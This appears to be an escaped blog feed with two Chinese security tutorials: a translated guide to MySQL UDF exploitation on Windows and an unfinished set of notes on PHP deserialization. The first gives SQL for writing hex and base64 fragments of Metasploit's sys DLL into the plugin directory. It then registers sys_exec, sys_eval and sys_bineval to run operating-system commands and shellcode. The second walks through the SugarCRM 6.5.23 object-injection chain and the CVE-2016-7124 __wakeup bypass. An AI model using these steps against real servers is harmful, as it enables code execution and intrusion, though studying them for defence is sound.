&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create table temp(data longblob);

insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);

update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);

select data from temp into dump file &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;您也可以直接从磁盘将文件从网络共享加载到上面创建的表中，或使用“加载数据infile”语句在本地加载。像上面显示的那样将文件转换为十六进制，并在写入磁盘时取消对其的编辑。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;load data infile '\\\\192.168.0.19\\network\\udf.hex' 
into table temp fields terminated by '@OsandaMalith' 
lines terminated by '@OsandaMalith' (data);

select unhex(data) from temp into dumpfile 'D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;从MySQL 5.6.1和MariaDB 10.0.5开始有好消息。介绍了函数’to_base64’和’from_base64’。如果你是一个喜欢绕过SQL注入WAFs的人，你可能已经在使用这些函数（提示：路由查询注入）。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select to_base64(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) 
into dumpfile '/tmp/udf.b64';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;您可以编辑base64文件并添加以下行以转储到插件目录。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select from_base64(&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4
s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA
AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA
EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA
AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA
AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR
EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;) 
into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;之后，你可以像这样将整个文件传递给mysql。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql -h 192.168.0.30 -uosanda -pabc123 &amp;lt; /tmp/udf.b64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;您也可以使用上面讨论的“load data infile”语句直接从网络共享或本地编写base64编码文件，并像这样转储。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select from_base64(data) from temp 
into dumpfile 'D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;探索dll&quot;&gt;探索DLL&lt;/h2&gt;
&lt;p&gt;大多数时候我看到人们只写关于Metasploit内部的这个DLL中的’sys_exec’函数。为了好奇，我想到了扭转这个DLL并探索其他功能。如果我们检查导出目录，我们可以看到作者写了几个更有用的函数。我会展示一些有用的功能。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/export-dir.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;sys_exec&quot;&gt;sys_exec&lt;/h3&gt;
&lt;p&gt;该函数将在“系统”函数内传递参数’args-&amp;gt; args [0]’。您可以使用它在目标机器上执行系统命令。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_exec2.png&quot; alt=&quot;&quot; /&gt;
Installation&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create function sys_exec returns int soname 'udf.dll';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Verification&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from mysql.func where name = 'sys_exec';
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_exec |   2 | udf.dll | function |
+----------+-----+---------+----------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Deletion&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drop function sys_exec;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;sys_eval&quot;&gt;sys_eval&lt;/h3&gt;
&lt;p&gt;该功能将执行系统命令并在屏幕上通过标准输出显示。正如你可以使用这个函数一样，使用_popen函数和’r’参数，calling process can read the spawned command’s standard output via the returned stream。它使用’fgets’来读取pipe到缓冲区，它会返回缓冲区。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_eval.png&quot; alt=&quot;&quot; /&gt;
Installation&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create function sys_eval returns string soname 'udf.dll';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Verification&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from mysql.func where name = 'sys_eval';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Deletion&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drop function sys_eval;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Example&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select sys_eval('dir');
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_eval_example.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;sys_get&quot;&gt;sys_get&lt;/h3&gt;
&lt;p&gt;该函数使用’getenv’函数返回系统变量的值。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_get_dis.png&quot; alt=&quot;&quot; /&gt;
Installation&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create function sys_get returns string soname 'udf.dll';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Verification&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from mysql.func where name = 'sys_get';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Deletion&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Drop function sys_get;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Example&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Select sys_get('longonserver');
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_get.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;执行shellcode---sys_bineval&quot;&gt;执行Shellcode - sys_bineval&lt;/h3&gt;
&lt;p&gt;我在这个DLL里面找到了一个很酷的函数’sys_bineval’。该函数将使用’VirtualAlloc’API分配RWX内存，并使用’strcpy’将’args-&amp;gt; args [0]’复制到新分配的内存中。然后这个缓冲区被传递给’CreateThread’API来产生一个新的线程。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_bineval.png&quot; alt=&quot;&quot; /&gt;
如果我们看看’CreateThread’API，我们可以看到使用’strcpy’复制缓冲区的’lpParameter’作为指针传递给要传递给线程的变量。’StartAddress’中的函数将直接移动’lpParamter’并调用ptr rax，这将改变RIP到我们的shellcode。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/sys_bineval2.png&quot; alt=&quot;&quot; /&gt;
Installation&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create function sys_bineval returns int soname 'udf.dll';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Verification&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from mysql.func where name = 'sys_bineval';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Deletion&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drop function sys_bineval;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Example
但是没有工作在64位。这32位平台中工作正常。您可以直接打开原始二进制shellcode或编码为base64或十六进制编码并使用此功能执行。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select sys_bineval(from_base64(load_file('./calc.b64')));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/shellcode.png?w=768&quot; alt=&quot;&quot; /&gt;
我注意到这些外部UDF函数在拆解代码中没有适当的异常处理。因此，在调用这些函数时稍有错误会导致mysqld.exe服务器崩溃。我希望这篇文章可能对你有用，同时记录下MySQL。&lt;/p&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
&lt;p&gt;http://ftp.nchu.edu.tw/MySQL/doc/refman/5.0/en/create-function-udf.html
http://ftp.nchu.edu.tw/MySQL/doc/refman/4.1/en/create-function-udf.html
https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/extending-mysql.html
https://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-1.html
https://dev.mysql.com/doc/refman/5.7/en/udf-arguments.html
https://msdn.microsoft.com/en-us/library/aa298534(v=vs.60).aspx&lt;/p&gt;

&lt;h4 id=&quot;papers&quot;&gt;Papers&lt;/h4&gt;
&lt;p&gt;Exploit-DB
Packet Storm&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">本文首发先知社区，如需转载请联系先知社区 原文地址https://osandamalith.com/2018/02/11/mysql-udf-exploitation/ 综述 在现实世界中，当我登录金融机构时，遇到了他们的内网并且使用MySQL 5.7 64位作为后端数据库的场景。大多数时候，我在环境中遇到MSSQL，这是一种罕见的情况（mysql）。我在Web应用程序中发现了SQL注入，并且能够从mysql.user dump用户名和密码我意识到它有权将文件写入磁盘。这使我写了一篇文章，分享关于向MySQL写入udf.dll，使之代码执行和在Windows中弹出一个shell的技巧。当我在谷歌搜索大多数的技术文章，当涉及到Windows，文章解释的不太清楚。所以，我想用我自己的研究来写这篇文章来使之更加清楚，并让你了解一些手工使用的技巧。</summary></entry><entry><title type="html">php反序列化小结</title><link href="http://localhost:4000/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/" rel="alternate" type="text/html" title="php反序列化小结" /><published>2018-03-08T03:50:30-05:00</published><updated>2018-03-08T03:50:30-05:00</updated><id>http://localhost:4000/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/">&lt;h3 id=&quot;0x00-关注函数&quot;&gt;0x00 关注函数&lt;/h3&gt;
&lt;p&gt;Command Execution 
exec()
shell_exec()
pcntl_exec()
passthru()
popen()
system()
assert()
eval()&lt;/p&gt;

&lt;p&gt;File Access
file_put_contents()
file_get_contents()
unlink()&lt;/p&gt;

&lt;p&gt;construct()实例化被调用
destruct()实例化对象完调用，
toString() echo一个对象被调用
wakeup()反序列化时先调用&lt;/p&gt;

&lt;h3 id=&quot;0x01-composerphp包管理工具&quot;&gt;0x01 Composer(php包管理工具)&lt;/h3&gt;
&lt;p&gt;Composer用autoloading技术还可以自动导入三方依赖库中的类(只需要在php文件开头加 require &lt;strong&gt;DIR&lt;/strong&gt;.’/vendor/autoload.php;’)&lt;/p&gt;

&lt;h3 id=&quot;0x02-序列化后数据含义&quot;&gt;0x02 序列化后数据含义&lt;/h3&gt;
&lt;p&gt;运行&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;tom0li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'abc'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$class1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tom0li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$class1_ser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$class1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$class1_ser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'filename.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$class1_ser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;serlialize序列化后数据&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	O:6:&quot;tom0li&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;abc&quot;;}
	O:6: 这里O代表对象，(a则代表数组)，6为对象长6字符，&quot;tom0li&quot;为对象名，1表示有一个值。
	{s:4:&quot;test&quot;;s:3:&quot;abc&quot;;} s表示字符串，4长度，&quot;test&quot;为值(i为int)，($test=&quot;abc&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;运行&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;tom0li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'abc'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$class1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tom0li&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$class1_ser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$class1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$class1_ser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'filename.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$class1_ser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	O:6:&quot;tom0li&quot;:1:{s:12:&quot;tom0litest&quot;;s:3:&quot;abc&quot;;} 对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上'* '。这些前缀值在任一侧都有空字节。 所以为s:12:&quot;tom0litest&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x03-常用magic函数&quot;&gt;0x03 常用magic函数&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	__construct()实例化被调用
	__destruct()实例化对象完调用，
	__toString() echo一个对象被调用
	__wakeup()反序列化时先调用
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x04-sugarcrm-v6523-php反序列化对象&quot;&gt;0x04 SugarCRM v6.5.23 PHP反序列化对象&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;找反序列化的可控参数&lt;/li&gt;
  &lt;li&gt;找magic函数(__construct(),__destruct(),__wakeup())&amp;amp;上面的关键函数&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‘service/core/REST/SugarRestSerialize.php’ 中的 ‘serve’ 函数&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function serve(){
    $GLOBALS['log']-&amp;gt;info('Begin: SugarRestSerialize-&amp;gt;serve');
    $data = !empty($_REQUEST['rest_data'])? $_REQUEST['rest_data']: '';
    if(empty($_REQUEST['method']) || !method_exists($this-&amp;gt;implementation, $_REQUEST['method'])){
        ...
    }else{
        $method = $_REQUEST['method'];
        $data = sugar_unserialize(from_html($data));
        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;可控$data = !empty($_REQUEST[‘rest_data’])，from_html解码$data
sugar_unserialize()&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/**
 * Performs unserialization. Accepts all types except Objects
 *
 * @param string $value Serialized value of any type except Object
 * @return mixed False if Object, converted value for other cases
 */
function sugar_unserialize($value)
{
    preg_match('/[oc]:\d+:/i', $value, $matches);

    if (count($matches)) {
        return false;
    }

    return unserialize($value);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;unserialize($value);然后找magic&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function __destruct()
{
    parent::__destruct();

    if ( $this-&amp;amp;gt;_cacheChanged )
        sugar_file_put_contents(sugar_cached($this-&amp;amp;gt;_cacheFileName), serialize($this-&amp;amp;gt;_localStore));
}

/**
* This is needed to prevent unserialize vulnerability
*/
public function __wakeup()
{
    // clean all properties
    foreach(get_object_vars($this) as $k =&amp;amp;gt; $v) {
        $this-&amp;amp;gt;$k = null;
    }
    throw new Exception(&quot;Not a serializable object&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;sugar_file_put_contents&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function sugar_file_put_contents($filename, $data, $flags=null, $context=null){
    //check to see if the file exists, if not then use touch to create it.
    if(!file_exists($filename)){
        sugar_touch($filename);
    }

    if ( !is_writable($filename) ) {
        $GLOBALS['log']-&amp;amp;gt;error(&quot;File $filename cannot be written to&quot;);
        return false;
    }

    if(empty($flags)) {
        return file_put_contents($filename, $data);
    } elseif(empty($context)) {
        return file_put_contents($filename, $data, $flags);
    } else{
        return file_put_contents($filename, $data, $flags, $context);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;file_put_contents写文件，把$data也就是$_this-&amp;gt;_localStore传为数组，shell传为数组的值。
CVE-2016-7124 对象属性个数的值大于真实的属性个数时就会跳过wakeup
比如O:6:”tom0li”:1:{s:4:”test”;s:3:”abc”;}改为O:6:”tom0li”:2:{s:4:”test”;s:3:”abc”;}
跳过__wakeup防止清空&lt;/p&gt;

&lt;h3 id=&quot;0x05-相同的方法或变量&quot;&gt;0x05 相同的方法或变量&lt;/h3&gt;

&lt;p&gt;POP chain利用的条件是找到的魔术方法不可以直接利用，但它有调用其它方法或者使用其它的变量时，可以在其它的类中寻找同名的方法或是变量，直到可以利用的点&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;tom1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;one&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;one&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
